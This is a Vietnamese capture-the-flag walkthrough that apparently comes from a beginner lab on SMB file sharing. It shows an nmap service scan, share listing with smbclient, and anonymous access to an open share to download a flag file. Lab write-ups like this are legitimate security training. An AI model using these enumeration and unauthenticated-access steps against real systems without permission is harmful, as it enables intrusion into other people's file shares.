> Có nhiều cách để truyền file từ máy tính này sang máy tính khác trong một network. Trong target này là SMB, được dùng trong Windows.
### 1. Tìm kiếm thông tin target
##### + Khởi động target.
###### IP: 10.129.241.56
##### + Quét cổng và dịch vụ:
` nmap -sV 10.129.241.56 `
##### => 135/tcp msrpc
##### => 139/tcp netbios-san
##### => *445/tcp microsoft-ds?* 
###### 445 là cổng cho SMB (Server Message Block), một protocol chia sẻ file, cho phép ứng dụng trên máy tính (hay người dùng sử dụng ứng dụng đó) đọc, tạo và viết file trên server từ xa. Nó cũng có thể giao tiếp với bất cứ chương trình server nào mà được set up để nhận yêu cầu từ SMB client.
##### + SMB lưu trữ dữ liệu vào nơi được gọi là share, và để xem được thông tin từ share, ta sẽ sử dụng một script tên là smbclient:
##### + Cài đặt smbclient:
` sudo apt-get install smbclient `
###### Để xem thêm cách sử dụng smbclient, gõ lệnh smbclient -h
##### + Xem các file được lưu trữ trong *share*:
` smbclient -L 10.129.241.56 `
###### -L: chọn host để yêu cầu kết nối
```
$smbclient -L 10.129.241.56
Password for [WORKGROUP\hoang]: *Vì đăng nhập ẩn danh nên ấn Enter để bỏ qua*
        sharename      type        comment
        ---------      ----        -------
        ADMIN$         Disk        Remote Admin
        C$             DIsk        Default Admin
        IPC$           IPC         Remote IPC
        WorkShares     Disk
...
```
###### Xem thêm thông tin về các share: https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/
##### + Như vậy có tất cả 4 share, thử kết nối với các share và bỏ qua mật khẩu:
```
$smbclient ////10.129.241.56//ADMIN$ *NT_STATUS_HOST_UNREACHABLE*
$smbclient ////10.129.241.56//C$ *NT_STATUS_HOST_UNREACHABLE*
$smbclient ////10.129.241.56//IPC$ *NT_STATUS_HOST_UNREACHABLE*
$smbclient ////10.129.241.56//WorkShares => Truy cập thành công
```
### 2. Khai thác lỗ hổng
##### + Trong WorkShares:
```
smb: \> ls
  .
  ..
  Amy.J ...
  James.P ...
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .
  ..
  worknotes.txt ...
smb: \Amy.J\> cd..
smb: \> cd James.P
smb: \James.P\> ls
  .
  ..
  flag.txt ...
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```
##### + Trong thu mục máy chủ:
```
ls
cat flag.txt
```
